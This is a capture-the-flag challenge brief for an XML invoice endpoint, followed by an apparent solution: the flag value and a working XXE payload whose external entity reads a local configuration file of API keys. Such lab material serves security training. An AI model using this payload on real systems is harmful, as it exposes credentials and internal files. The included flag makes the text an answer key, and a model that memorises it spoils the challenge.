Challenge: TechVault Invoice System

Difficulty: Medium
Description

TechVault Solutions operates a B2B invoice processing platform that accepts XML-based invoices from registered suppliers. The system validates supplier information and generates approval tokens.

During a security audit, suspicious file access patterns were detected. Investigate the invoice submission endpoint and exploit any vulnerabilities to retrieve the database password from the internal configuration file.

Challenge url: 

BOunty: P@ssw0rd_2025_Secure!
xml payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///tmp/techvault/config/api_keys.xml">
]>
<invoice>
    <invoiceId>INV-XXE-EXPLOIT</invoiceId>
    <supplier>
        <name>&xxe;</name>
        <vendorCode>EXPLOIT-001</vendorCode>
    </supplier>
    <items>
        <item>
            <description>XXE Attack</description>
            <amount>0.00</amount>
            <currency>USD</currency>
        </item>
    </items>
    <total>0.00</total>
</invoice>
